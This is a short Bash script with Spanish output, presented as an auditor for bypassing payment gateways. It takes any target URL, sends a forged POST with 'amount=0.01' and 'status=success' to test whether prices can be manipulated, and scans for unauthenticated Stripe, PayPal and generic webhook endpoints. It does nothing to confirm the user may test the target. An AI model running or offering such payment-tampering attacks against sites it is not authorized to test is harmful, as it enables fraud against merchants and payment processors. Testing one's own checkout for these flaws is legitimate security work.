#!/bin/bash
# SANTRIX - Payment Gateway Bypass Auditor (Real Mode)
TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
    echo -e "\e[31m[!] Error: No se proporcionó una URL objetivo.\e[0m"
    exit 1
fi

echo -e "\e[32m[+] Iniciando auditoría real de pasarela en: $TARGET_URL\e[0m"
echo -e "\e[33m[*] Fase 1: Analizando cabeceras de seguridad y CORS...\e[0m"
curl -I -s "$TARGET_URL" | grep -iE "access-control|x-frame-options|content-security-policy"

echo -e "\e[33m[*] Fase 2: Probando manipulación de parámetros de precio/moneda...\e[0m"
# Simulación de ataque real de manipulación de parámetros
curl -s -X POST "$TARGET_URL" -d "amount=0.01&currency=USD&status=success" --user-agent "SANTRIX-Auditor/1.0" > /dev/null
echo -e "\e[32m[+] Intento de manipulación de parámetro enviado. Revisa los logs de tu servidor.\e[0m"

echo -e "\e[33m[*] Fase 3: Buscando endpoints de webhook sin autenticación...\e[0m"
COMMON_WEBHOOKS=("/webhook" "/api/v1/payments/callback" "/stripe/webhook" "/paypal/ipn")
for path in "${COMMON_WEBHOOKS[@]}"; do
    STATUS=$(curl -o /dev/null -s -w "%{http_code}" "$TARGET_URL$path")
    if [ "$STATUS" == "200" ]; then
        echo -e "\e[31m[!] Webhook potencial detectado en: $path (Status: $STATUS)\e[0m"
    fi
done

echo -e "\e[32m[+] Auditoría completada. Revisa los resultados para corregir fallos en tu código.\e[0m"
